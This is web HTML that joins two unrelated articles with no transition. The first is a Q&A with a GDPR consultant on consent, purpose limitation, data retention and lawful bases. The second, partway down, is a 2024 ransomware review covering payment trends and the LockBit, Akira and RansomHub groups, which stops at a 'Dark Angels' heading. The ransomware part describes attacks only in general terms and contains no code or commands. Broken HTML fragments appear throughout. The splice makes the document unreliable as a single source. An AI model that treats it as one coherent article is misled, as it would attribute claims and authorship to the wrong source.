&lt;p&gt;You’d think organisations can get something as basic as ‘lawfulness, fairness and transparency’ right, but no!&lt;/p&gt;



&lt;p&gt;There are often problems with the lawfulness of personal data processing, largely due to over-reliance on consent. Organisations still don’t understand what consent &lt;em&gt;actually&lt;/em&gt; entails.&lt;/p&gt;
&lt;/blockquote&gt;



&lt;p&gt;&lt;em&gt;I sat down with Andy to find out more. How are organisations failing to process personal data lawfully under the GDPR, and how can they address this while improving their day-to-day business operations?&lt;/em&gt;&lt;/p&gt;

&lt;/ul&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading"&gt;Introduction&lt;/h2&gt;



&lt;p&gt;&lt;strong&gt;You say organisations misunderstand consent under the GDPR. Could you elaborate?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;Suppose you have an organisation processing a million people’s data for &lt;a href="https://www.itgovernance.co.uk/green-papers/gdpr-and-pecr-a-guide-for-marketers" rel="noreferrer noopener" target="_blank"&gt;marketing&lt;/a&gt; purposes based on consent. &lt;a href="https://www.itgovernance.co.uk/blog/how-you-can-demonstrate-gdpr-compliance" rel="noreferrer noopener" target="_blank"&gt;Accountability&lt;/a&gt; says you must be able to &lt;em&gt;demonstrate&lt;/em&gt; that consent – but organisations frequently can’t.&lt;/p&gt;



&lt;p&gt;And then we face the next problem. Out of that million people, when was the last time someone purchased something? Or even &lt;em&gt;engaged&lt;/em&gt; with the marketing: &lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Within the last month?&lt;/li&gt;



&lt;li&gt;Within the last three months?&lt;/li&gt;



&lt;li&gt;Within the last six months?&lt;/li&gt;



&lt;li&gt;Within the last year?&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Few organisations can give me that breakdown.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Stay ahead of the curve with expert insights on data privacy.&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;&amp;nbsp;&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;&lt;/em&gt;&lt;/strong&gt;&amp;nbsp;&lt;/p&gt;



&lt;p class="has-text-align-center"&gt;&lt;em&gt;To get notified of future&lt;/em&gt;&lt;em&gt; &lt;/em&gt;&lt;em&gt;Q&amp;amp;As and other free resources like this, subscribe to&lt;/em&gt;&amp;nbsp;&lt;br /&gt;&lt;em&gt;our free weekly newsletter&lt;/em&gt;&lt;em&gt;,&lt;/em&gt;&lt;em&gt; the &lt;/em&gt;&lt;strong&gt;&lt;em&gt;Security Spotlight&lt;/em&gt;&lt;/strong&gt;&lt;em&gt;.&lt;/em&gt;&lt;em&gt;&lt;/em&gt;&amp;nbsp;&lt;/p&gt;



&lt;div class="wp-block-buttons is-content-justification-center is-layout-flex wp-container-core-buttons-is-layout-10 wp-block-buttons-is-layout-flex"&gt;
&lt;div class="wp-block-button"&gt;&lt;a class="wp-block-button__link has-white-color has-luminous-vivid-orange-background-color has-text-color has-background has-link-color wp-element-button" href="https://www.itgovernance.co.uk/security-spotlight-newsletter" rel="noreferrer noopener" target="_blank"&gt;Subscribe now &lt;/a&gt;&lt;/div&gt;
&lt;/div&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Business-benefits-of-GDPR-compliance"&gt;Business benefits of GDPR compliance&lt;/h2&gt;



&lt;p&gt;&lt;strong&gt;Putting consent aside for a moment [we come back to it &lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#Consent"&gt;later&lt;/a&gt;], collecting that much data you’re not using seems counterproductive from a business point of view too.&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;Absolutely! Suppose the head of marketing reported to the board that the organisation is marketing to a million people. That &lt;em&gt;sounds&lt;/em&gt; good – except that figure is incredibly misleading if only a tiny percentage engages with that marketing.&lt;/p&gt;



&lt;p&gt;Sure, collecting more information &lt;em&gt;technically&lt;/em&gt; means more business opportunity. But it also means more risk: if you suffer a &lt;a href="https://www.itgovernance.co.uk/blog/how-long-do-you-have-to-report-a-data-breach" rel="noreferrer noopener" target="_blank"&gt;data breach&lt;/a&gt;, the impact will be far greater.&lt;/p&gt;



&lt;p&gt;More data also means more storage space, which tends to go hand in hand with a larger attack surface. In other words, it’s not just the potential impact that’s greater – you’re more likely to suffer a breach to begin with.&lt;/p&gt;



&lt;p&gt;Not to mention how storage space costs money, both for &lt;a href="https://www.itgovernance.co.uk/blog/7-ways-to-avoid-physical-security-threats-in-the-workplace" rel="noreferrer noopener" target="_blank"&gt;hard-copy&lt;/a&gt; and digital information. That cost can grow exponentially when also accounting for backups.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Purpose-limitation"&gt;Purpose limitation&lt;/h2&gt;



&lt;p&gt;&lt;strong&gt;What’s a clue that an organisation is processing too much personal data?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;When you can’t point to a clear reason for storing or processing that personal data. [Principle 2 – purpose limitation.]&lt;/p&gt;



&lt;p&gt;If you can’t point to one, that’s not just unlawful – it strongly signals that keeping the data serves no &lt;em&gt;business&lt;/em&gt; purpose either.&lt;/p&gt;



&lt;p&gt;This is what I like about the GDPR – if you adhere to its principles, you’re not just protecting people’s data, but also running your business better.&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;Can you give us a real-life example?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;Visitor logs are a good one. What do you keep them for? What purpose do they serve?&lt;/p&gt;



&lt;p&gt;Well, they’re generally used to account for who is within the building on a given day – in case of having to do a headcount if you had to evacuate the building, for example.&lt;/p&gt;



&lt;p&gt;So, why would you need to keep those logs for any longer than that day? [Which many organisations do.]&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;Shouldn’t you keep visitor logs for the same time you keep &lt;/strong&gt;&lt;a href="https://www.itgovernance.co.uk/blog/does-your-use-of-cctv-comply-with-the-gdpr" rel="noreferrer noopener" target="_blank"&gt;&lt;strong&gt;CCTV&lt;/strong&gt;&lt;/a&gt;&lt;strong&gt; footage?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;&lt;em&gt;Exactly&lt;/em&gt;. A couple of years back, I was on-site with a client. They had me sign a visitor’s book. They also took my picture.&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Me: “Why do you need my picture?”&lt;/li&gt;



&lt;li&gt;Client: “If we identify suspicious activity on CCTV, we can use those pictures to identify the person.”&lt;/li&gt;



&lt;li&gt;M: “Excellent! So, how long do you keep your CCTV footage for?”&lt;/li&gt;



&lt;li&gt;C: “We store it on a rolling 30-day cycle.”&lt;/li&gt;



&lt;li&gt;M: “Fantastic. How long do you keep visitor pictures for?”&lt;/li&gt;



&lt;li&gt;C: “We’ve got them going back to 2009.”&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;That stayed with me as the perfect example of people not understanding why they’re collecting data, how they’re using that data, or how long they should be keeping it for.&lt;/p&gt;



&lt;p&gt;That said, this is just &lt;em&gt;one&lt;/em&gt; reason for collecting this information. In specific scenarios, you may have to keep it for extended periods.&lt;/p&gt;



&lt;p&gt;A good example might be that an incident had taken place, so you need to keep the footage and pictures from a specific period for longer – the duration of the investigation and possible court case.&lt;/p&gt;



&lt;p&gt;Your retention periods can allow for leeway to your usual periods for these types of scenarios – you can set out the &lt;em&gt;criteria&lt;/em&gt; for setting your retention periods as well as concrete time periods.&lt;/p&gt;



&lt;p&gt;Either way, it comes back to data minimisation and purpose limitation: only collect personal data for a specific purpose, and keep it only for as long as necessary for that purpose.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Retention-periods"&gt;Retention periods&lt;/h2&gt;



&lt;p&gt;&lt;strong&gt;Let’s come back to your earlier marketing example: an organisation has a massive marketing mailing list but only a fraction of people on it interact with that marketing.&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Where do we go from there?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;Your &lt;a href="https://www.itgovernance.co.uk/blog/top-tips-for-data-retention-under-the-gdpr" rel="noreferrer noopener" target="_blank"&gt;retention schedule&lt;/a&gt; should make clear when you’re archiving those records [assuming you don’t use them for other purposes] after some reasonable period. That might be six months, or perhaps a year.&lt;/p&gt;



&lt;p&gt;At a minimum, your retention schedule should set out the &lt;em&gt;criteria&lt;/em&gt; for setting the retention periods. [Also see the earlier explanation.]&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;What does ‘archiving’ mean in this context? And how long should it remain in the archive before the data is permanently deleted or destroyed?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;If someone ends up on a marketing list, you may have already been processing their data for a different reason – most obviously, because they purchased something.&lt;/p&gt;



&lt;p&gt;So, suppose that person opted out of marketing. You’d then no longer actively process their data, but you’d need to store their records to meet your legal and/or contractual obligations. That’s a form of archiving – storing personal data and safeguarding it with encryption, or another appropriate measure, but not doing anything else with that data.&lt;/p&gt;



&lt;p&gt;You’d then destroy it once the retention period for that legal or contractual obligation runs out.&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;Can data be truly destroyed?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;Most organisations will simply click ‘delete’, and not do additional storage media sanitisation, like overwriting it at least seven times to sanitise the storage media, or use a software solution that ‘shreds’ the data electronically.&lt;/p&gt;



&lt;p&gt;But the GDPR is risk-based, and in many circumstances, such state-of-the-art measures wouldn’t be proportionate. So, someone just presses ‘delete’, then the data should be gone – including from backups – within a month of that deletion.&lt;/p&gt;



&lt;p&gt;The key is to make the personal data unidentifiable, using the tools reasonably available. After all, it’s a criminal offence to attempt to re-identify de-identified data!&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;Coming back to retention periods, how can an organisation establish a “reasonable” retention period?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;Organisations must ask themselves: when do we say ‘enough is enough’? Where do we draw that line in the sand and stop contacting this person? When does it become clear that they’re not going to respond, and we’re wasting time and resources by trying to contact them again?&lt;/p&gt;



&lt;p&gt;The exact moment depends on the organisation. What type of product or service are you trying to sell? If you’re a luxury retailer, or selling high-ticket items like fridge freezers, your expectations are different to an organisation that sells, say, monthly subscriptions.&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;What other problems do you see around data retention?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;One classic scenario is what you do with the data of someone who leaves an organisation. You’ll then archive the record – but what part of that record?&lt;/p&gt;



&lt;p&gt;The trouble is that organisations treat personal data as a ‘bundle’, rather than look at the individual categories of data.&lt;/p&gt;



&lt;p&gt;For example, unless you had to use the person’s emergency contact details while they were employed, you can likely destroy that part of their record immediately after they leave. You no longer have a reason to keep that data.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Take your understanding of GDPR to the&lt;br /&gt; next level with expert-led training.&lt;/strong&gt;&lt;/p&gt;

&lt;/div&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Lawful-bases"&gt;Lawful bases&lt;/h2&gt;



&lt;p&gt;&lt;strong&gt;We’ve touched on the reasons for, or purposes of, processing a few times now. Of course, these link closely to the &lt;/strong&gt;&lt;a href="https://www.itgovernance.co.uk/blog/gdpr-lawful-bases-for-processing-with-examples" rel="noreferrer noopener" target="_blank"&gt;&lt;strong&gt;lawful bases&lt;/strong&gt;&lt;/a&gt;&lt;strong&gt;. The basic GDPR rules around them seem reasonably straightforward: you need to be able to rely on one of the six lawful bases to process personal data lawfully.&lt;/strong&gt;&lt;/p&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="" class="wp-image-47017" height="454" src="https://www.itgovernance.co.uk/blog/wp-content/uploads/2024/11/image-2.png" width="938" /&gt;&lt;/figure&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;So, where do problems arise?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;People don’t understand that the lawful bases are &lt;em&gt;not&lt;/em&gt; an open-ended ticket – they need &lt;em&gt;time limits&lt;/em&gt;. They need &lt;em&gt;relevance&lt;/em&gt; [i.e. purpose limitation].&lt;/p&gt;



&lt;p&gt;You need to know what your legal and contractual requirements are for data processing and retention. Beyond that, you need to understand what &lt;em&gt;you&lt;/em&gt; need the data for.&lt;/p&gt;



&lt;p&gt;Let’s take a basic example: an employment contract.&lt;/p&gt;



&lt;p&gt;When you employ someone, the contract will say you’re processing personal data to fulfil your contractual obligations. Upon termination of that contract, the lawful basis changes. At that point, you’re keeping the personal data for six years to meet a legal obligation.&lt;/p&gt;



&lt;p&gt;Some organisations might extend that to seven years, but that means you have to change the lawful basis again at the end of the sixth year: to legitimate interests. And you’ll have to show you can justify that legitimate interest through your LIA [legitimate interests assessment].&lt;/p&gt;



&lt;p&gt;Again, understand the lawful basis you’re relying on and its limitations. Whatever the purpose for processing, it needs to come with a life span appropriate to that purpose.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Consent"&gt;Consent&lt;/h2&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="" class="wp-image-47016" height="423" src="https://www.itgovernance.co.uk/blog/wp-content/uploads/2024/11/image-1.png" width="938" /&gt;&lt;/figure&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;Speaking of lawful bases, let’s come back to consent.&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;The ‘typical’ requirements of consent aside [see above], must consent also be refreshed? And is there a link with appropriate retention periods, when processing personal data for marketing purposes?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;Refreshing consent isn’t an explicit GDPR requirement – you either have consent or you don’t. The ICO was clear about that in the early days of the GDPR, and said something similar about the &lt;a href="https://www.itgovernance.co.uk/the-pecr-and-eu-eprivacy-directive" rel="noreferrer noopener" target="_blank"&gt;PECR&lt;/a&gt; [Privacy and Electronic Communications Regulations 2003].&lt;/p&gt;



&lt;p&gt;This includes the time-limit aspect. Once your retention period is hit, you no longer have consent – it’s not a grey area. You must then either archive that data or get new consent.&lt;/p&gt;



&lt;p&gt;That means asking the person if they want to receive marketing on XYZ – remember, consent must be clear, informed and given for a specific purpose to be valid.&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;What happens if one person in an organisation withdraws consent for marketing? Would you then be able to market to others within that same organisation?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;Yes – the consent is for that individual, not for the overall organisation.&lt;/p&gt;



&lt;p&gt;Equally, if you’re about to approach a new person in that organisation, and someone else has already objected to marketing, you can still ask this other person for their consent.&lt;/p&gt;



&lt;p&gt;That said, be aware of the CTPS and FPS [Corporate Telephone Preference Service and Fax Preference Service]. These are central UK registers for businesses to opt out of unsolicited marketing phone calls and faxes, and apply to all employees within the businesses listed.&lt;/p&gt;



&lt;p&gt;So, before you make cold calls [or send cold faxes], check those registers.&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;What else must marketers be aware of around consent and the GDPR?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;If you buy a marketing list, and email the people on that list, people may opt out of marketing from your organisation.&lt;/p&gt;



&lt;p&gt;Suppose that, a few weeks or months later, you then buy a new marketing list that has some duplicate email addresses with the first list. Make sure you don’t email those people again by putting them on a suppression list.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Lawful-processing:-not-breaking-other-laws"&gt;Lawful processing: not breaking other laws&lt;/h2&gt;



&lt;p&gt;&lt;strong&gt;We’ve talked a lot about the lawful bases under the GDPR. What about the other sense of ‘lawful’ processing [under the first data protection principle] – not breaking any other laws?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;The EU GDPR was designed to integrate with EU laws, so you won’t get conflicts there. And although the UK has now left the EU, we haven’t seen too many differences between UK and EU law post-Brexit – at least, as far as data privacy and data processing go.&lt;/p&gt;



&lt;p&gt;But the further afield you go, the more problems you might run into – I gave an example of that in &lt;a href="https://www.itgovernance.co.uk/blog/transferring-personal-data-under-the-gdpr#Mechanism-3" rel="noreferrer noopener" target="_blank"&gt;my blog&lt;/a&gt; about international transfers. [A large Saudi Arabian organisation is prevented by national law to report data breaches outside Saudi Arabia.]&lt;/p&gt;



&lt;p&gt;In a nutshell, the stricter requirement will always apply. That’s typically been the GDPR, particularly within Europe. However, we may see more divergence as the Regulation ages, and more new laws with stricter requirements than the GDPR emerge.&lt;/p&gt;

&lt;p&gt;As we look back on the cybersecurity landscape of 2024, it&amp;#8217;s clear that the world of digital threats continues to evolve at an alarming pace in parallel with AI. This year has seen ransomware groups adapt and innovate, pushing the boundaries of their malicious capabilities and evasiveness from law enforcement. In our annual &amp;#8220;Nastiest Malware&amp;#8221; report, now in its sixth year, we&amp;#8217;ve observed a steady increase in both the number and sophistication of malware attacks. The ransomware sector, in particular, has witnessed the emergence of &amp;#8220;business models,&amp;#8221; with ransomware-as-a-service (RaaS) dominating the scene. Elite ransomware authors have concluded that profit sharing and risk mitigation are key contributors to their consistent success and evasion of authorities.&lt;/p&gt;



&lt;p&gt;The &lt;a href="https://community.opentextcybersecurity.com/cybersecurity-standpoint-174/lockbit-saga-continues-return-of-the-fbi-357646" rel="noreferrer noopener" target="_blank"&gt;saga of LockBit&lt;/a&gt; in 2024 exemplifies the resilience and adaptability of these cybercriminal groups. Despite a major law enforcement operation in February, dubbed &amp;#8220;Operation Cronos,&amp;#8221; which saw the FBI and international partners seize LockBit&amp;#8217;s infrastructure and obtain over 7,000 decryption keys, the group managed to resurface within days. This cat-and-mouse game between LockBit and law enforcement agencies has continued throughout the year, with the group&amp;#8217;s leader even taunting the FBI, claiming that their efforts only make LockBit stronger. The LockBit story underscores a crucial point: while law enforcement operations can disrupt cybercriminal activities, they often fall short of delivering a knockout blow. These groups have become adept at rebuilding their infrastructure, rebranding when necessary, and continuing their operations with minimal downtime.&lt;/p&gt;



&lt;p&gt;As we detail our analysis of the six most notorious ransomware and malware groups that have dominated headlines in 2024, it&amp;#8217;s important to note that the threat landscape extends beyond just these actors. The rise of AI-driven phishing and social engineering, increased targeting of critical infrastructure, and the emergence of more sophisticated fileless malware are all trends that have shaped the cybersecurity battlefield this year.&lt;/p&gt;



&lt;p&gt;In this report, we&amp;#8217;ll explore how these groups have evolved, their most significant attacks, and the broader implications for cybersecurity. We&amp;#8217;ll also provide updated survival tips for both businesses and individual users, reflecting the ever-changing nature of these threats.&lt;/p&gt;



&lt;h2&gt;Ransomware&lt;/h2&gt;



&lt;p&gt;Over the past decade, ransomware has established itself as the pinnacle of cybercriminal exploits. It is the most successful and lucrative avenue for monetizing a breach of a victim. Every year we see more and more data stolen and higher ransom demands dominating headlines. Each ransomware group on our Nastiest Malware list utilizes the double-extortion method where the data stolen is leveraged for leak potential on dark web leak sites. The impending damage to brand and reputation that comes with the public disclosure of a breach are massive threats to companies of any size. Not to mention the impending regulatory fines that come with the breach. This strategy has shown it’s resilience over the past few years since it became mainstream and it seems to be as robust as ever. Let’s take a look at what the payment numbers look like so far in 2024.&lt;/p&gt;



&lt;div class="is-layout-flex wp-container-6 wp-block-columns"&gt;

&lt;/div&gt;



&lt;div class="is-layout-flow wp-block-column"&gt;&lt;/div&gt;
&lt;/div&gt;



&lt;p class="has-text-align-center"&gt;&lt;strong&gt;&lt;em&gt;Source:&amp;nbsp;&lt;a href="https://www.coveware.com/blog/2024/7/29/ransomware-actors-pivot-away-from-major-brands-in-q2-2024" rel="noreferrer noopener" target="_blank"&gt;Coveware&lt;/a&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;&lt;/p&gt;



&lt;p&gt;We’ve seen a drop-off from the highs last year &amp;#8211; fueled by Cl0p ransomware group making over $100 Million in a few months in late 2023. But when we zoom out you can see that it will be going up over time. This time next year we anticipate the amounts to be higher than what they are now. Some of this will be fueled by inflation, some will be an increase in effectiveness in tactics, and some by the anticipated 2025 “bull run” price spike in crypto &amp;#8211; the only payment method these criminals accept.&lt;/p&gt;



&lt;figure class="wp-block-image size-large"&gt;&lt;a href="https://blog-en.webroot.com/wp-content/uploads/2024/10/31080435/ransomware-chart-1.png"&gt;&lt;img alt="Chart showing ransomware payment rates declining from 2019 to 2024." class="wp-image-33451" height="427" src="https://blog-en.webroot.com/wp-content/uploads/2024/10/31080435/ransomware-chart-1-1024x427.png" width="1024" /&gt;&lt;/a&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;br /&gt;&lt;/figcaption&gt;&lt;/figure&gt;



&lt;p&gt;Looking at the payment resolution rates &amp;#8211; meaning the percentage of people that end up paying the ransom, we can see a slight increase during this year. Zooming out the trend does indicate an overall decline which is good news and reflects that the industry is taking serious precautions in their security posture. We expect that this slight increase is only temporary and will continue the trend of decreasing for next year. &lt;/p&gt;



&lt;figure class="wp-block-image size-full is-resized"&gt;&lt;a href="https://blog-en.webroot.com/wp-content/uploads/2024/10/31080635/ransomware-pie-chart.png"&gt;&lt;img alt="Pie chart showing companies by size that have been impacted by ransomware. Companies with 101 to 1,000 employees were most impacted." class="wp-image-33453" height="354" src="https://blog-en.webroot.com/wp-content/uploads/2024/10/31080635/ransomware-pie-chart.png" width="601" /&gt;&lt;/a&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;br /&gt;&lt;/figcaption&gt;&lt;/figure&gt;



&lt;p&gt;One nasty change this year is the increase of ransomware attacks on smaller sized businesses. The market share of ransomware attacks on business with under 100 employees is now almost &lt;strong&gt;40%&lt;/strong&gt;. While the media headlines of record breaking ransoms against fortune 500 companies will always take center stage, the small to mid market has always been the bread and butter for cybercriminals. The amount of effort and return on investment of time is too good for criminals not to be attracted to these easier and weaker targets. Now let’s take a look at this year’s Nastiest Malware.&lt;/p&gt;



&lt;h2&gt;LockBit: The Resilient Threat&lt;/h2&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;a href="https://blog-en.webroot.com/wp-content/uploads/2024/10/31080926/lockbit-graphic.jpg"&gt;&lt;img alt="Color illustration explaining impact of the Lockbit ransomware attack." class="wp-image-33455" height="512" src="https://blog-en.webroot.com/wp-content/uploads/2024/10/31080926/lockbit-graphic.jpg" width="1000" /&gt;&lt;/a&gt;&lt;/figure&gt;



&lt;p&gt;&lt;/p&gt;



&lt;p&gt;One of the most notorious ransomware groups, LockBit, faced significant challenges and disruptions in 2024 due to coordinated international law enforcement efforts. The year began with &amp;#8220;Operation Cronos,&amp;#8221; a major strike against LockBit&amp;#8217;s infrastructure in February. Led by the UK&amp;#8217;s National Crime Agency (NCA) and involving agencies from multiple countries, including the FBI, this operation resulted in the seizure of LockBit&amp;#8217;s leak sites and the exposure of information about nearly 200 affiliates. A pivotal moment came when the FBI obtained over 7,000 decryption keys, allowing victims to unlock their encrypted data for free. This dealt a severe blow to LockBit&amp;#8217;s operations and credibility &amp;#8211; remember that most of the success and money is from the affiliates that choose thier ransomware payload over another’s group so credibility and trust are paramount in this criminals scene.&lt;/p&gt;



&lt;p&gt;Despite these setbacks, LockBit attempted to maintain its operations, quickly adapting by changing encryption methods and shifting its leak site strategy. However, law enforcement continued to apply pressure throughout the year. In May, authorities revealed the identity of LockBit&amp;#8217;s alleged mastermind, Dmitry Yuryevich Khoroshev, and offered a&amp;nbsp;&lt;a href="https://community.opentextcybersecurity.com/cybersecurity-standpoint-174/lockbit-saga-continues-return-of-the-fbi-357646"&gt;$10 Million reward&amp;nbsp;&lt;/a&gt;for information leading to his arrest. The culmination of these efforts came in October when law enforcement agencies announced additional arrests and disruptions. Four individuals connected to LockBit were arrested, including a major developer and two affiliates. Notably, Aleksandr Ryzhenkov, linked to both LockBit and the infamous Evil Corp group, was unmasked and sanctioned. These actions, part of the ongoing Operation Cronos, significantly impacted LockBit&amp;#8217;s operations, leading to a noticeable decrease in their attack frequency and causing distrust within the cybercriminal community.&lt;/p&gt;



&lt;p&gt;Despite LockBit&amp;#8217;s attempts to maintain its fearsome reputation, including false claims of attacks, the group&amp;#8217;s activities were impacted throughout 2024, marking a significant victory for global cybersecurity efforts. However, LockBit is still a major player in the RaaS scene and the leader and his affiliates are still making millions in ransoms. LockBit has proven its resilience in the face of law enforcement efforts, presenting the group&amp;#8217;s adaptability and persistence. The leader has boasted that he loves the FBI and that they only make his group stronger, and he wants to hit one million businesses before retirement. This is a stark contrast from most ransomware groups when hit by law enforcement as they will quickly retire the brand and repivot to another. This RaaS has been on the Nastiest Malware for over three years maintaining its status as a top contender in the Ransomware scene in 2024. &lt;/p&gt;



&lt;h2&gt;Akira: The Healthcare Menace&lt;/h2&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;a href="https://blog-en.webroot.com/wp-content/uploads/2024/10/31081146/akira-graphic.jpg"&gt;&lt;img alt="Color illustration explaining impact of the Akira ransomware attack." class="wp-image-33457" height="530" src="https://blog-en.webroot.com/wp-content/uploads/2024/10/31081146/akira-graphic.jpg" width="1000" /&gt;&lt;/a&gt;&lt;/figure&gt;



&lt;p&gt;&lt;/p&gt;



&lt;p&gt;The Akira ransomware group was&amp;nbsp;first observed in March 2023 and immediately became&amp;nbsp;one of the most formidable threats in the threat&amp;nbsp;landscape. By January 2024, the group had impacted over 250 organizations and claimed approximately $42 million in ransomware proceeds. Akira&amp;#8217;s rapid rise to the top was marked by its versatility and constant evolution of tactics. In 2024, Akira expanded its capabilities significantly. Initially focused on Windows systems, the group deployed a Linux variant targeting VMware ESXi virtual machines in April. Throughout the year, Akira demonstrated a pattern of swift adaptation to new vulnerabilities. They actively exploited several critical vulnerabilities, including&amp;nbsp;SonicWall SonicOS,&amp;nbsp;Cisco Adaptive Security Appliance (ASA), and&amp;nbsp;FortiClientEMS software. These exploits allowed Akira to gain initial access, escalate privileges, and move laterally within compromised networks.&lt;/p&gt;



&lt;p&gt;A notable shift in Akira&amp;#8217;s tactics occurred in early 2024 when they appeared to sideline encryption tactics, focusing primarily on data exfiltration. However, by September 2024, there were indications of a potential return to previous tactics using Windows and Linux payloads written in C++. This adaptability was further evidenced in a June 2024 attack on a Latin American airline, where Akira operators exploited vulnerable services to&amp;nbsp; deploy ransomware and exfiltrate data.&lt;/p&gt;



&lt;p&gt;Akira&amp;#8217;s victims spanned a wide range of sectors, with a particular focus on manufacturing, professional services, healthcare, and critical infrastructure. The group&amp;#8217;s success was attributed to its constant evolution, sophisticated attack methods, and the employment of double-extortion tactics. As of 2024, Akira had solidified its position as one of the most prevalent and dangerous ransomware operations in the cybersecurity threat landscape.&lt;/p&gt;



&lt;h2&gt;RansomHub: The High-Profile Attacker&lt;/h2&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;a href="https://blog-en.webroot.com/wp-content/uploads/2024/10/31081546/ransomhub-graphic.jpg"&gt;&lt;img alt="Color illustration explaining impact of the Ransomhub ransomware attack." class="wp-image-33459" height="496" src="https://blog-en.webroot.com/wp-content/uploads/2024/10/31081546/ransomhub-graphic.jpg" width="1000" /&gt;&lt;/a&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;br /&gt;&lt;/figcaption&gt;&lt;/figure&gt;



&lt;p&gt;RansomHub emerged as a formidable new player in the ransomware landscape in February 2024, quickly establishing itself as one of the most prolific and dangerous ransomware groups. Operating on a RaaS model, RansomHub attracted high-profile affiliates from other prominent groups like&amp;nbsp;BlackCat/ALPHV following their FBI takedown in December 2023. This is&amp;nbsp;likely due to its attractive payment structure where affiliates receive up to&amp;nbsp;&lt;strong&gt;90%&lt;/strong&gt;&amp;nbsp;of the ransom &amp;#8211; compared to around 30-50% with other groups.&lt;/p&gt;



&lt;p&gt;By August 2024, RansomHub had breached at least 210 victims across various critical U.S. infrastructure sectors, including healthcare, government services, financial services, and critical manufacturing. Notable attacks included breaches of Planned Parenthood, the Rite Aid drugstore chain, Christie&amp;#8217;s auction house, and Frontier Communications, with the latter resulting in the exposure of personal information of over 750,000 customers. RansomHub&amp;#8217;s tactics evolved throughout the year, employing sophisticated methods such as exploiting various software vulnerabilities, using intermittent encryption to speed up attacks, and leveraging double extortion techniques. The group&amp;#8217;s data leak site became a significant threat, with stolen data being published for 3-90 days if ransom demands were not met.&lt;/p&gt;



&lt;p&gt;The attack on Planned Parenthood not only demonstrated RansomHub&amp;#8217;s capability to breach highly sensitive networks but also highlighted their willingness to target organizations with high reputational risks. This sparked widespread concern and discussions on cybersecurity measures within nonprofit organizations. By October 2024, RansomHub had overtaken LockBit as the most prolific ransomware group in terms of claimed successful attacks, solidifying its position as a major threat in the cybersecurity landscape.&lt;/p&gt;



&lt;h2&gt;Dark Angels: The Whaling Experts&lt;/h2&gt;



